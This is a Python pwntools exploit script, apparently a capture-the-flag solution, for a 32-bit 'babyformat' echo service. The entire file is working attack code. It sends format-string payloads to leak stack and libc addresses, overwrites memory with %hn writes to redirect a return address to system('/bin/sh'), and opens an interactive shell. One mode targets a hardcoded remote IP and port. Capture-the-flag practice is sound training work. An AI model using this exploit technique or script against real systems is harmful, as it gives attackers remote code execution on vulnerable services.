from pwn import *


def babyformat(DEBUG):
	if DEBUG=="1":
		# https://libc.blukat.me/?q=system%3A0x3ada0&l=libc6_2.23-0ubuntu10_i386
		offset___libc_start_main_ret = 0x18637
		offset_system = 0x3ada0
		offset_str_bin_sh = 0x15ba0b
		
		r = process('./babyformat')
		raw_input("debug?")
	elif DEBUG=="2":
		# https://libc.blukat.me/?q=__libc_start_main_ret%3Ae81&l=libc6-i386_2.27-3ubuntu1_amd64
		offset___libc_start_main_ret = 0x18e81
		offset_system = 0x0003cd10
		offset_str_bin_sh = 0x17b8cf
		
		HOST = '104.196.99.62'
		PORT = 2222
		r = remote(HOST,PORT)
	
	# make fmt more
	r.recvuntil("==== Baby Format - Echo system ====\n")
	payload = '%6$p%9$p%7$p'
	assert len(payload) <= 13
	r.send(payload)

	ebp = eval(r.recv(10))
	addr = eval(r.recv(10))
	back_addr = eval(r.recv(10))-0xe
	leak = ebp-0x1c
	offset = (addr-leak)/4+7

	log.info("ebp: %#x" %ebp)
	log.info("addr: %#x" %addr)
	log.info("back_addr: %#x" %back_addr)
	log.info("leak: %#x" %leak)
	log.info("offset: %#x" %offset)
	payload = "%"+str(leak&0xffff)+"c%9$hn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv(leak&0xffff)

	payload = "%"+str(back_addr&0xffff)+"c"+"%"+str(offset)+"$hn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv(back_addr&0xffff)

	payload = "%"+str((leak+0x13)&0xffff)+"c%10$hn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv((leak+0x13)&0xffff)

	payload = "%"+str(0xff)+"c"+"%"+str(offset+2)+"$hhn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv(0xff)

	# leak libc and control eip
	payload = '-->%15$p%13$p'
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recvuntil('-->')
	_libc_start_main_ret = eval(r.recv(10))
	log.info("_libc_start_main_ret: %#x" % _libc_start_main_ret)

	libc = _libc_start_main_ret - offset___libc_start_main_ret
	log.info("libc: %#x" %libc)
	system = libc + offset_system
	sh = libc + offset_str_bin_sh
	log.info("system: %#x" %system)
	log.info("sh: %#x" %sh)

	retaddr = eval(r.recv(10)) - 4
	log.info("retaddr %#x" %retaddr)

	# write system
	payload = "%"+str(retaddr&0xffff)+"c%9$hn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv(retaddr&0xffff)

	payload = "%"+str((retaddr+2)&0xffff)+"c%10$hn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv(retaddr&0xffff)

	payload = "%"+str(system&0xffff)+"c"+"%"+str(offset)+"$hn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv(system&0xffff)

	payload = "%"+str((system>>16)&0xffff)+"c"+"%"+str(offset+2)+"$hn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv((system>>16)&0xffff)


	#write sh
	payload = "%"+str((retaddr+8)&0xffff)+"c%9$hn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv(retaddr&0xffff)

	payload = "%"+str((retaddr+10)&0xffff)+"c%10$hn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv(retaddr&0xffff)

	payload = "%"+str(sh&0xffff)+"c"+"%"+str(offset)+"$hn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv(sh&0xffff)

	payload = "%"+str((sh>>16)&0xffff)+"c"+"%"+str(offset+2)+"$hn"
	payload = payload.ljust(13, '\x00')
	assert len(payload) <= 13
	r.send(payload)
	r.recv((sh>>16)&0xffff)

	payload = 'EXIT'.ljust(13, '\x00')
	r.send(payload)
	r.recvuntil('EXIT')
	r.interactive()

babyformat(sys.argv[1])